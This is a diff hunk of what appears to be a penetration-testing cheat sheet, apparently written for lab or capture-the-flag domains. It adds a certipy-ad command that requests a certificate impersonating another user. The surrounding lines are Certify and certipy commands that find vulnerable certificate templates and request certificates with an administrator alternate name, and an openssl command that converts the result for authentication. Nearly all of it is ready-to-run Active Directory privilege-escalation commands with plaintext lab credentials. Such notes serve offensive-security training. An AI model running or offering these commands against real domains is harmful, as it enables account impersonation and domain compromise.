@@ -1557,6 +1557,7 @@ certipy req -u hazel.green -p haze1988 -target hokkaido-aerospace.com -upn admin
 # Taken from Certify's Github Page
 .\Certify.exe find /vulnerable
 .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:adminstrator /outfile:C:\Windows\Tasks\cert.pem
+certipy-ad req -u hazel.green@hokkaido-aerospace.com -p haze1988 -target-ip dc.hokkaido-aerospace.com -ca 'hokkaido-aerospace-DC-CA' -template 'User' -upn 'Molly.Smith@hokkaido-aerospace.com'
 certipy-ad req -u hazel.green -p haze1988 -target-ip dc.hokkaido-aerospace.com -upn Hazel.Green@hokkaido-aerospace.com -ca hokkaido-aerospace-DC-CA -template
 # Paste the RSA PRIVATE KEY in cert.pem file
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
